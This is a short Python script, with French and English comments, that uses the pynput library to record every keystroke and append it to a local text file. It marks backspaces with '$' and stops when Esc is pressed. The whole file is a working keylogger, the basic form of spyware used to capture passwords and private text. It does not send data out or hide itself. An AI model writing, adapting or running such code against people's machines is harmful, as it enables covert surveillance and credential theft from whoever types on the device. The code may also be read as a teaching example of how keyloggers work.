from pynput.keyboard import Key, Listener
import datetime

# Date actuelle de sauvegarde du fichier : eg. : 2020-09-17 09:26:13
date_time = datetime.datetime.now().strftime(("%Y-%m-%d : %H-%M-%S"))

# Variables :
keys = []

file = open('myfile.txt', 'a+')



print(date_time)

def on_press(key):
    global keys
    keys.append(str(key).replace("'", ""))
    print(keys[-1])
    if len(keys) > 10:
        write_keys(keys)
        keys = []

def write_keys(keys):
    for key in keys:
        if key == 'Key.enter':  # for enter it write a new line.
                file.write("\n")
        elif key == 'Key.space':#for space it will enter a space
            file.write(key.replace("Key.space"," "))
        elif key == 'Key.backspace':#for backspace it will enter a $
            # EX. well$come --> welcome (Actual word) , another example hellll$$$o --> helo (actual word) [hope it helps you to understand]
            file.write(key.replace("Key.backspace", "$"))
        else:
            file.write(key)

def on_release(key):
    if (key == Key.esc):
        file.close()
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
